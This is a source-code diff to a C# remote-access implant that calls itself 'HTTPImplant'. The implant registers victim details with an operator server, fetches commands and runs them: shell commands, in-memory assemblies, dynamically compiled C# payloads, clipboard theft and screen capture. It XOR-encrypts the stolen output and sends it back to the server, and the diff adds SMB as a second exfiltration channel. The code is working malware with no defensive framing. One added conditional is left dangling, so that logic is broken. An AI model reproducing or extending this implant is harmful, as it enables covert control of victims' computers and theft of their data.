@@ -21,7 +21,7 @@ namespace HTTPImplant
         public string TimeToExec { get; set; }
         public string Delay { get; set; }
         public string File { get; set; }
-        public string NullTerm { get; set; }
+        public string usesmb { get; set; }
     }
 
     public class Victim
@@ -42,9 +42,11 @@ namespace HTTPImplant
     public class Implant
     {
         public static Victim victim = new Victim();
-        public string host { get; set; }  // Host of the implant server
-        public string port { get; set; }  // Port of the implant server
+        public static string host = "localhost";  // Host of the implant server
+        public static string port = "8083"; // Port of the implant server
         private static string lastCommandExecuted = string.Empty; // Store the last command that was executed
+        public static bool SMB = false;
+        private static bool usesmb;
 
         public static void Main(string[] args)
         {
@@ -62,7 +64,7 @@ namespace HTTPImplant
             string victim_information = GenerateJson();
 
             // Console.WriteLine(victim_information);
-            Console.WriteLine("Registering Implant...");
+            // Console.WriteLine("Registering Implant...");
 
             await RegisterImplant(victim_information);
             var victim = new Victim();
@@ -94,7 +96,7 @@ namespace HTTPImplant
                 {
                     try
                     {
-                        string jsonResponse = await webClient.DownloadStringTaskAsync(new Uri("http://127.0.0.1:8081/getCommand"));
+                        string jsonResponse = await webClient.DownloadStringTaskAsync(new Uri("http://" + host + ":" + port + "/getCommand"));
                         Console.WriteLine("Getting instructions...");
 
                         Command command = new Command();
@@ -106,7 +108,18 @@ namespace HTTPImplant
                         command.Delay = jsonResponse.Split(new string[] { "\"delay\":\"", "\",\"timeToExec" }, StringSplitOptions.None)[1];
                         command.TimeToExec = jsonResponse.Split(new string[] { "\"timeToExec\":\"", "\",\"File" }, StringSplitOptions.None)[1];
                         command.File = jsonResponse.Split(new string[] { "\"File\":\"", "\",\"nullterm" }, StringSplitOptions.None)[1];
-                        command.NullTerm = jsonResponse.Split(new string[] { "\"nullterm\":\"", "\"}" }, StringSplitOptions.None)[1];
+                        command.usesmb = jsonResponse.Split(new string[] { "\"usesmb\":\"", "\"}" }, StringSplitOptions.None)[1];
+
+                        if (!bool.TryParse(command.usesmb, out usesmb))
+
+                        if (usesmb)
+                        {
+                            SMB = true; // Assuming SMB is a boolean variable
+                        } else
+                        {
+                            SMB = false;
+                        }
+
 
                         /*Console.WriteLine("User for issued command: " + command.ImplantUser);
                         Console.WriteLine("Current implant user: " + victim.Username);*/
@@ -134,43 +147,39 @@ namespace HTTPImplant
                                     string output = ExecuteAssembly.Execute(bytes);
                                     string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
                                     Console.WriteLine(output);
-                                    await SendResult(webClient, implantId, command.Operator, outputBase64);
+                                    await SendResult(webClient, implantId, command.Operator, outputBase64, SMB);
                                 }
                                 else if (command.Input.Trim().Equals("os", StringComparison.OrdinalIgnoreCase))
                                 {
                                     Console.WriteLine("Running command: " + command.command);
                                     string output = Commands.command(command.command, command.Args);
                                     string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
-                                    await SendResult(webClient, implantId, command.Operator, outputBase64);
+                                    await SendResult(webClient, implantId, command.Operator, outputBase64, SMB);
                                 }
                                 else if (command.Input.Trim().Equals("clip", StringComparison.OrdinalIgnoreCase))
                                 {
                                     Console.WriteLine("Running clipboard fetcher... ");
                                     string output = ClipboardFetcher.GetData();
                                     string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
-                                    await SendResult(webClient, implantId, command.Operator, outputBase64);
+                                    await SendResult(webClient, implantId, command.Operator, outputBase64, SMB);
                                 }
                                 else if (command.Input.Trim().Equals("screengrab", StringComparison.OrdinalIgnoreCase))
                                 {
                                     Console.WriteLine("Running screen fetcher... ");
                                     string output = ScreenGrab.CaptureScreen();
-                                    await SendResult(webClient, implantId, command.Operator, output);
+                                    await SendResult(webClient, implantId, command.Operator, output, SMB);
                                 }
                                 else if (command.Input.Trim().Equals("loadcs", StringComparison.OrdinalIgnoreCase))
                                 {
                                     Console.WriteLine("Attempting to Compile and Run .NET C# Code...");
-
                                     try
                                     {
-                                        string[] parts = command.File.Split('|').Select(part => part.Trim()).ToArray();
+                                        string encodedSourceCode = command.File;
+                                        string Args = command.Args;
+                                        byte[] code = Convert.FromBase64String(encodedSourceCode);
+                                        string decodedSourceCode = Encoding.UTF8.GetString(code);
 
-                                        string encodedSourceCode = parts[0];
-                                        string className = parts[1];
-                                        string methodName = parts[2];
-                                        byte[] data = Convert.FromBase64String(encodedSourceCode);
-                                        string decodedSourceCode = Encoding.UTF8.GetString(data);
-
-                                        CompileAndRunNET.ExecuteCS(decodedSourceCode, className, methodName);
+                                        CompileAndRunNET.ExecuteCS(decodedSourceCode, Args, true);
                                     }
                                     catch (Exception ex)
                                     {
@@ -193,7 +202,7 @@ namespace HTTPImplant
             }
         }
 
-        public static async Task SendResult(WebClient webClient, string implantId, string operatorId, string outputBase64)
+        public static async Task SendResult(WebClient webClient, string implantId, string operatorId, string outputBase64, bool useSMB)
         {
             string XORKeyB64 = "NVm5dzr1hyhOm4jBTNSFhQGrFhR1gvhbn/BbvZowkO0=";
             byte[] XORKey = Convert.FromBase64String(XORKeyB64);
@@ -202,7 +211,13 @@ namespace HTTPImplant
             byte[] encryptedResultJson = XOR(Encoding.UTF8.GetBytes(resultJson), XORKey);
 
             string data = Convert.ToBase64String(encryptedResultJson);
-            await webClient.UploadStringTaskAsync(new Uri("http://127.0.0.1:8081/postOutput"), "POST", data);
+            if (!useSMB)
+            {
+                await webClient.UploadStringTaskAsync(new Uri("http://" + host + ":" + port + "/postOutput"), "POST", data);
+            } else
+            {
+                SMBClient.SendData(data);
+            }
         }
 
         public static byte[] XOR(byte[] data, byte[] key)
@@ -282,7 +297,7 @@ namespace HTTPImplant
                 webClient.Headers[HttpRequestHeader.ContentType] = "application/json";
                 try
                 {
-                    await webClient.UploadStringTaskAsync(new Uri("http://127.0.0.1:8081/registerNewImplant"), "POST", victim_json);
+                    await webClient.UploadStringTaskAsync(new Uri("http://" + host + ":" + port + "/registerNewImplant"), "POST", victim_json);
                 }
                 catch (WebException ex)
                 {
